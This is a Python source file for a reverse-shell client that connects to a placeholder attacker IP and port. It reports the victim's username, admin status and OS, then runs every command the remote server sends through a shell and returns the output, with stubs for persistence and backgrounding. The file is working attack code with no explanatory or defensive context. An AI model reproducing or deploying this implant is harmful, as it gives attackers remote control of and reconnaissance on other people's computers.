import socket
import subprocess
import os
from ctypes import *
import platform
import time



def session_handler(sock, target_ip, target_port):
    try:
        print(f'[+] Connecting to {target_ip}.')
        sock.connect((target_ip, target_port))
        outbound(sock, os.getlogin())
        outbound(sock, windll.shell32.IsUserAnAdmin)
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(sock, op_sys)
        print(f'[+] Connected to {target_ip}.')
        while True:

            message = inbound(sock)
            print(f'[+] Message received - {message}')
            if message == 'exit':
                print('[-] The server has terminated the session.')
                sock.close()
                break
            elif message == 'persist':
                pass
            if message.split(" ")[0] == 'cd':
                change_directory(sock, message)
            elif message == 'background':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(sock, output.decode())
    except ConnectionRefusedError:
        pass


def process_message(sock, message):
    if message.split(" ")[0] == 'cd':
        change_directory(sock, message)
    elif message == 'background':
        pass
    else:
        execute_command(sock, message)
        return


def change_directory(sock, message):
    try:
        directory = str(message.split(" ")[1])
        os.chdir(directory)
        cur_dir = os.getcwd()
        print(f'[+] Changed to {cur_dir}')
        outbound(sock, cur_dir)
        return
    except FileNotFoundError:
        outbound(sock, 'Invalid directory.  Try again.')
        return


def execute_command(sock, message):
    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()
    outbound(sock, output.decode())
    return


def inbound(sock):
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()


def outbound(sock, message):
    response = str(message).encode()
    sock.send(response)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        target_ip = 'INPUT_IP_HERE'
        target_port = INPUT_PORT_HERE
        session_handler(sock, target_ip, target_port)
    except IndexError:
        print('[-] Command line argument(s) missing.  Please try again.')
        return
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
